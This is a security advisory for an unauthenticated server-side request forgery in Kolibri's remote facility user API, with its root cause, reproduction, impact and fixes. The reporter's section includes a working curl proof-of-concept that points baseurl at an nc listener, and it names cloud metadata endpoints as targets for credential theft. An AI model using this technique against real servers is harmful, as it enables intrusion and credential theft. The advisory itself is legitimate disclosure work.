@@ -1,0 +1,155 @@
+PYSEC-2026-2554 PyPI/kolibri — Kolibri has Unauthenticated Server-Side Request Forgery (SSRF) in RemoteFacilityUserViewset
+package: kolibri
+ecosystem: PyPI
+versions affected:
+  >= 0, < 0.19.4 (ECOSYSTEM)
+aliases: CVE-2026-48053, GHSA-4mj9-pf4r-cqrc
+references:
+  https://github.com/learningequality/kolibri/security/advisories/GHSA-4mj9-pf4r-cqrc
+  https://github.com/learningequality/kolibri
+  https://github.com/learningequality/kolibri/releases/tag/v0.19.4
+  https://pypi.org/project/kolibri
+  https://github.com/advisories/GHSA-4mj9-pf4r-cqrc
+  https://nvd.nist.gov/vuln/detail/CVE-2026-48053
+
+## Summary
+
+Several Kolibri API endpoints accept an unvalidated `baseurl` parameter and fetch attacker-controlled URLs from the Kolibri server, reflecting the response body back to the caller. The original report identified two endpoints on the `RemoteFacilityUser*` viewsets; remediation review found two further reflection points on the same pattern. The GET endpoint was unauthenticated.
+
+## Affected endpoints
+
+Reported:
+
+- `GET /api/auth/remotefacilityuser` → `RemoteFacilityUserViewset` (`kolibri/core/auth/api.py:1570`). No authentication required.
+- `POST /api/auth/remotefacilityauthenticateduserinfo` → `RemoteFacilityUserAuthenticatedViewset` (`kolibri/core/auth/api.py:1594`). Authentication is checked against the *remote* server rather than the local Kolibri.
+
+Found during remediation:
+
+- `POST /api/public/setupwizard/loddata` → setup wizard's remote-signup proxy (`kolibri/plugins/setup_wizard/api.py`). Reachable on unprovisioned devices.
+- `GET /api/public/networklocation/<id>/facilities/` → `NetworkLocationFacilitiesView` (`kolibri/core/discovery/api.py`). Authenticated but with the same `Response(remote_payload)` pattern.
+
+## Root cause
+
+Two compounding issues:
+
+1. **Response reflection** — these endpoints returned the remote server's JSON body more or less verbatim to the caller (`Response(response.json())`, `Response(facility_info["users"])`, etc.).
+2. **No restriction on the remote target** — `baseurl` was validated only by `URLValidator(schemes=["http", "https"])`. `NetworkClient.build_for_address()` would connect to any host with a valid Kolibri-shaped `/api/public/info/` response, and `requests` followed 30x redirects by default, so a hostile peer could pivot the fetch to an arbitrary host (cloud metadata, internal services) before reflection.
+
+## Two reflection vectors
+
+**GET vector (`RemoteFacilityUserViewset`):**
+The viewset fetched `<baseurl>/api/public/facilitysearchuser/` and returned `Response(response.json())`. An attacker-controlled `baseurl` returned a 302 to an arbitrary internal URL; `requests` followed the redirect, and the redirected response body was returned to the attacker.
+
+**POST vector (`RemoteFacilityUserAuthenticatedViewset`):**
+`get_remote_users_info()` fetched `<baseurl>/api/public/facilityuser/` with Basic Auth and the viewset returned `Response(facility_info["users"])`. A malicious `baseurl` returned crafted user-shaped JSON; arbitrary smuggled fields were reflected back to the caller. The setup wizard and `NetworkLocationFacilitiesView` endpoints had the same shape on different remote URLs.
+
+## Reproduction
+
+The vulnerability can be reproduced by pointing `baseurl` at an attacker-controlled HTTP server that:
+
+1. Responds to `GET /api/public/info/` with a valid Kolibri info payload (so `NetworkClient.build_for_address()` succeeds).
+2. **GET vector:** responds to `GET /api/public/facilitysearchuser/` with a 302 redirect to the target URL. The redirected response body is reflected via `Response(response.json())`.
+3. **POST vector:** responds to the relevant remote URL with crafted JSON containing additional fields. The full JSON is reflected.
+
+A working PoC has been retained internally and is not published with this advisory.
+
+## Demonstrated impact (pre-fix)
+
+- **Unauthenticated outbound requests from the Kolibri server** to any HTTP(S) URL the attacker chose (GET endpoint only; the others required auth or an unprovisioned device).
+- **Reflected data exfiltration** for any HTTP endpoint that responded to a plain `GET` with JSON and no special request headers.
+- **Cloud metadata reachability** was realistic but service-specific:
+  - AWS IMDSv1 — reachable
+  - DigitalOcean (`/metadata/v1.json`) — reachable
+  - GCP, Azure, AWS IMDSv2 — *not* reachable via this vector (require `Metadata-Flavor` / `Metadata` / token headers that the attacker could not inject)
+- **Reachability of internal HTTP services** on the same network as the Kolibri server, with their JSON responses returned to the attacker.
+
+## Not demonstrated
+
+The earlier draft asserted port scanning via a timing oracle and generic "internal network mapping." The reflection vector reads response bodies directly when the target speaks JSON; timing-based scanning of arbitrary TCP services was not demonstrated and is not the headline risk.
+
+## Mitigation
+
+Four layers of defence:
+
+1. **Response sanitisation.** Each affected endpoint now coerces the remote response to a documented shape before returning it. Smuggled fields are dropped.
+2. **Authentication.** The previously-open `RemoteFacilityUser*` endpoints now require an authenticated caller (or an unprovisioned device, for setup-wizard flows).
+3. **Cross-host redirect blocking.** Remote-fetch HTTP sessions refuse 30x responses that point to a different hostname. Same-host redirects still work.
+4. **Peer allowlist.** Endpoints that accept a caller-supplied `baseurl` resolve it only to peers Kolibri already knows about, rather than connecting to arbitrary hosts. Discovery and CLI flows that legitimately need to probe new addresses use a separate code path.
+
+## Credit
+
+Initial report and identification of the `RemoteFacilityUser*` viewsets by @beraoudabdelkhalek. Reflection-based PoC, additional vector identification, and remediation by the Kolibri maintainers.
+
+
+<details><summary>Original report by @beraoudabdelkhalek</summary>
+
+### Summary
+The `RemoteFacilityUserViewset` API endpoint (`/api/auth/remotefacilityuser`) has no authentication or permission checks and accepts a user-controlled `baseurl` parameter. This parameter is passed directly to `NetworkClient.build_for_address()` which makes server-side HTTP requests to the attacker-specified URL. An unauthenticated attacker can force the Kolibri server to reach out to arbitrary internal hosts, port-scan internal networks, and access cloud metadata endpoints.
+
+### Details
+
+This is mainly due to the following issues:
+
+**1. Missing authentication on the API endpoint**
+
+File: `kolibri/core/auth/api.py`, line ~1553
+
+```python
+class RemoteFacilityUserViewset(views.APIView):  # No permission_classes → AllowAny
+    def get(self, request):
+        baseurl = request.query_params.get("baseurl", "")
+        validator(baseurl)  # Only checks URL format (http/https scheme + valid hostname)
+        client = NetworkClient.build_for_address(baseurl)
+        response = client.get(url, params={"facility": facility, "search": username})
+```
+
+No `permission_classes` attribute is defined, and `DEFAULT_PERMISSION_CLASSES` is not set in the DRF configuration, so the endpoint defaults to `AllowAny` , accepting requests with zero authentication.
+
+Similarly, `RemoteFacilityUserAuthenticatedViewset` (line ~1577, POST endpoint) also has no `permission_classes`, though it currently checks permissions via a different mechanism. The initial `build_for_address()` call still fires before that check.
+
+**2. Weak URL validation**
+
+File: `kolibri/utils/urls.py`, line 1-7
+
+```python
+from django.core.validators import URLValidator
+validator = URLValidator(schemes=["http", "https"])
+```
+
+The only validation is that the URL has an http or https scheme and a valid hostname. There is no block on:
+- RFC 1918 private IPs (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
+- Loopback addresses (127.0.0.0/8, ::1)
+- Link-local addresses (169.254.0.0/16, including AWS/GCP/Azure metadata endpoints)
+- IPv6 equivalents of any of the above
+
+### PoC
+**Prerequisites**: A listener on a host reachable by the Kolibri server (e.g., `nc -lvp 1337`) the listener can be local or remote.
+
+Against a local Docker deployment (validated against Kolibri 0.19.3):
+
+```bash
+# Trigger the SSRF no auth headers needed
+curl "http://localhost:8080/api/auth/remotefacilityuser?baseurl=http://172.17.0.1:1337&username=test&facility=<facility_id>"
+```
+
+The Kolibri server makes an outbound HTTP request to the attacker's listener:
+
+```
+GET /api/public/info/?v=3 HTTP/1.1
+Host: 172.17.0.1:1337
+User-Agent: Kolibri/0.19.3 python-requests/2.27.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+```
+
+Testers have also confirmed the issue against live deployments of Kolibri.
+
+### Impact
+Unauthenticated SSRF : any attacker who can reach the Kolibri server can make it issue HTTP requests to arbitrary hosts, with no credentials needed
+Internal network scanning : the built-in port scanning behavior (5+ ports per HTTP target, 24+ connection attempts per request) allows mapping internal networks through the timing oracle
+Cloud metadata access : if Kolibri runs on a cloud VM (AWS EC2, GCP, Azure), the attacker can reach 169.254.169.254 and potentially exfiltrate IAM credentials and instance metadata
+Internal service discovery : other Kolibri instances or internal services on the network can be discovered and their API responses read by the attacker
+Blind SSRF via POST endpoint : RemoteFacilityUserAuthenticatedViewset returns 403 to the attacker but still makes the outbound request before the permission check
+
+</details>
